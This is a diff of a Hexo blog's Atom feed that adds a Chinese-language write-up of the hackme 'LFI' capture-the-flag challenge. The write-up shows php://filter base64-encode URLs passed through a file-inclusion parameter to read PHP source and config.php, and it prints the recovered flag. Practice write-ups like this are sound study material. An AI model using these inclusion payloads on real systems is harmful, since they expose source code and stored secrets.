@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-09-30T07:57:26.332Z</updated>
+  <updated>2019-09-30T08:21:55.729Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,11 +17,38 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>LFI</title>
+    <link href="http://yoursite.com/2019/09/30/LFI/"/>
+    <id>http://yoursite.com/2019/09/30/LFI/</id>
+    <published>2019-09-30T08:08:52.000Z</published>
+    <updated>2019-09-30T08:21:55.729Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="src-hackme-LFI"><a href="#src-hackme-LFI" class="headerlink" title="[src = hackme] LFI"></a>[src = hackme] LFI</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, php://filter</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到题目页面。网页的URL为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a></p><p>点击Introduction时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/intro" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/intro</a></p><p>点击Login时，URL变为：<a href="https://hackme.inndy.tw/lfi/?page=pages/login" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/login</a></p><p>可以看到参数page为文件包含。题目提示不要管admin和密码，所以猜测是不是有一个flag的文件，可以包含进来。尝试<br><a href="https://hackme.inndy.tw/lfi/?page=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/flag</a><br>显示下面的页面：<br><img src="./lfi1.PNG" alt="lfi"><br>页面提示“Can you read the flag?”。再看题目的第二个提示，php://filter，因为LFI只能读取到非php文件的源码，所以对PHP文件只能解析执行，所以要看到PHP文件的源码，需要通过通过php://filter/read=convert.base64-encode/resource= 利用LFI来查看源码。构造下面的URL：<br><a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</a><br>得到一串Base64解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you read the flag<span class="meta">&lt;?php</span> <span class="keyword">require</span>(<span class="string">'config.php'</span>); <span class="meta">?&gt;</span>?</span><br></pre></td></tr></table></figure><p>再尝试同样的方式读取config.php（<a href="https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config）</a>.得到的base64解码得到flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo&#125;"</span>;</span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本地文件包含是一个重要的Web漏洞，结合php://filter/可以泄露源码。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;src-hackme-LFI&quot;&gt;&lt;a href=&quot;#src-hackme-LFI&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] LFI&quot;&gt;&lt;/a&gt;[src = hackme] LFI&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;What this admin’s password? That is not important at all, just get the flag.&lt;br&gt;Tips: LFI, php://filter&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
+    
+    
+      <category term="LFI" scheme="http://yoursite.com/tags/LFI/"/>
+    
+      <category term="本地文件包含" scheme="http://yoursite.com/tags/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+      <category term="php://filter" scheme="http://yoursite.com/tags/php-filter/"/>
+    
+  </entry>
+  
+  <entry>
     <title>homepage</title>
     <link href="http://yoursite.com/2019/09/30/homepage/"/>
     <id>http://yoursite.com/2019/09/30/homepage/</id>
     <published>2019-09-30T07:49:54.000Z</published>
-    <updated>2019-09-30T07:57:26.332Z</updated>
+    <updated>2019-09-30T08:09:11.824Z</updated>
     
     <content type="html"><![CDATA[<h2 id="src-hackme-homepage"><a href="#src-hackme-homepage" class="headerlink" title="[src = hackme] homepage"></a>[src = hackme] homepage</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Where is the flag? Did you check the code?</p> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>点击题目，跳转到网站主页。题目提示要检查主页的代码，按照惯例，查看主页源代码，在最后发现cute.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"cute.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>打开，发现下面的内容：</p><p><img src="./cute.PNG" alt="cute"></p><p>将这段代码放到火狐浏览器的控制台（F12），执行得到一个二维码，扫码得到flag：</p><p><img src="./cute1.PNG" alt="cute"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>JavaScript是前端脚本语言，比如XSS等漏洞就出现在其中，浏览器的F12功能在调试浏览器代码过程中也非常有用！</p>]]></content>
     
@@ -35,7 +62,7 @@
       <category term="WEB" scheme="http://yoursite.com/categories/WEB/"/>
     
     
-      <category term="js" scheme="http://yoursite.com/tags/js/"/>
+      <category term="JavaScript" scheme="http://yoursite.com/tags/JavaScript/"/>
     
   </entry>
   
@@ -104,9 +131,9 @@
       <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
     
     
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
       <category term="AES" scheme="http://yoursite.com/tags/AES/"/>
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
     
   </entry>
   
@@ -181,9 +208,9 @@
       <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
     
     
-      <category term="base64" scheme="http://yoursite.com/tags/base64/"/>
-    
       <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+      <category term="base64" scheme="http://yoursite.com/tags/base64/"/>
     
   </entry>
   
@@ -283,9 +310,9 @@
       <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
     
     
-      <category term="base64" scheme="http://yoursite.com/tags/base64/"/>
-    
       <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+      <category term="base64" scheme="http://yoursite.com/tags/base64/"/>
     
   </entry>
   
